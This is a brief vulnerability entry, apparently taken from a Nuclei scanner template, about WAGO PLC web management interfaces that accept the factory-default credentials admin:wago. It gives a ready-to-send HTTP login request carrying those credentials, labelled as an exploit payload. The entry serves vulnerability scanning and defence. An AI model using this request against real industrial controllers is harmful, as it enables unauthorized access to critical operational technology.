# Vulnerability: WAGO Web based Management - Default Login
**Classification:** WAGO
**Source:** Nuclei Template (`wago-webbased-default-login.yaml`)

## Description
Identified WAGO Web-Based Management interfaces that were accessible using default credentials (admin:wago).These interfaces are used to configure and monitor WAGO programmable logic controllers (PLCs) and automation systems. Use of factory-default credentials exposed critical OT infrastructure to unauthorized access.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wbm/login.php HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Origin: {{RootURL}}
Referer: {{RootURL}}/wbm/index.php

{"username":"admin","password":"wago"}
```

